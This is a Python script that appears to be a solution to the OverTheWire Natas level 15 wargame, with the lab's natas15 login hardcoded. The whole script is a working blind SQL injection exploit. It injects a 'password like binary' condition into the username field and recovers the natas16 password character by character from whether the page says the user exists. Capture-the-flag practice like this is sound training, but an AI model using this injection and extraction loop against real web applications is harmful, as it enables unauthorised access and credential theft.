#!/usr/bin/env python3

import requests
from string import digits, ascii_letters

CHARS = ascii_letters + digits
ADDR = "http://natas15.natas.labs.overthewire.org/index.php"
CREDS = ("natas15", "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx")

QUERY = "username=natas16\" AND password like binary "


def output(passw, currentChar, end):
    print(f"{len(passw)} out of X chars found: {passw + currentChar}", end=end)


s = requests.session()
s.auth = CREDS

password = ""
while True:
    pass_copy = password

    for char in CHARS:
        output(password, char, "\r")

        payload = {"username" : f"natas16\" AND password like binary \"{password + char}%\" # --"}
        
        resp = s.post(ADDR, data=payload)

        if "This user exists." in resp.text:
            password += char
            break

    if password == pass_copy:
        output(password, "", "")
        break




